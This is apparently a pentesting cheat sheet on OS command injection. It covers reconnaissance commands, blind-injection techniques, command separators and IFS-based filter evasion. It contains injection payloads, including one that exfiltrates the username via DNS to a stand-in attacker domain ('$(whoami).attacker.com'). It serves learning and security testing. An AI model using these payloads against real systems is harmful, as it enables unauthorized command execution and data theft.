# OS Command Injection Overview

## Introduction

OS Command Injection is a security vulnerability that occurs when an application passes unsafe user-supplied data to a system shell. This can allow attackers to execute arbitrary commands on the host operating system under the privileges of the vulnerable application.

## Common Commands

| Purpose                | Linux        | Windows        |
|------------------------|--------------|----------------|
| Name of current user   | `whoami`     | `whoami`       |
| Operating system       | `uname -a`   | `ver`          |
| Network configuration  | `ifconfig`   | `ipconfig /all`|
| Network connections    | `netstat -an`| `netstat -an`  |
| Running processes      | `ps -ef`     | `tasklist`     |

## Exploring Vulnerabilities

- **Parameter Manipulation**: Altering parameters in an application might trigger errors indicating that a command is being executed in the background. Use special characters like `|` or `&` to append additional commands.

- **Blind OS Command Injection**:
  - **Time Delays**: Use commands like `ping` to create a delay, indicating a command execution.
    - Example: `& ping -c 10 127.0.0.1 &`
  - **Output Redirection**: Redirect the output of commands to a directory that you can access.
    - Example: `& whoami > /var/www/static/whoami.txt &`
  - **DNS Lookups**: Use `nslookup` to see if DNS queries can be made from the server.
    - Example: `& nslookup $(whoami).attacker.com &`

## Command Separators

Command separators can vary based on the operating system and can be used to chain multiple commands:

- **Universal**:
  - `&`, `&&`, `|`, `||`
- **Unix-specific**:
  - `;`, `\n` (newline)
  - Inline execution: `` `command` ``, `$(command)`

## Escaping Command Contexts

When input appears within quotation marks in the original command, you must first terminate the quoted context (`"`, `'`) before injecting new commands.

## Special Characters and Encodings

- **Internal Field Separator (IFS)**: In scenarios where spaces are filtered, the IFS variable can be used as a substitute for spaces.
  - Example: Use `cat${IFS}*.txt` to concatenate and display `.txt` files when spaces are blocked.
